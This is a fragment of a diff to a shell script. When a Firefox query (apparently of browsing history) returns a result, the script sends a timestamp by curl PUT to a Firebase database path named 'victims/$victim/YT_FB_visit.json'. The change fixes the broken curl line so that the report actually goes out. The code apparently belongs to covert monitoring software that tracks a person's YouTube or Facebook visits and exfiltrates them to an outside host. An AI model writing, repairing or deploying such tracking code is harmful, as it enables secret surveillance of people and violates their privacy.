@@ -50,7 +50,9 @@ function firefoxQuery(){
 
 
 if [ ! -z `firefoxQuery` ]; then
-  curl -X PUT -d "`date '+%s'`" "curl -s "https://${firebaseProject}.firebaseio.com/victims/$victim/YT_FB_visit.json"
+
+  currentTime=`date '+%s'`
+  curl -s -X PUT -d "$currentTime" "https://${firebaseProject}.firebaseio.com/victims/$victim/YT_FB_visit.json"
 fi
 
 sleep 1.1;
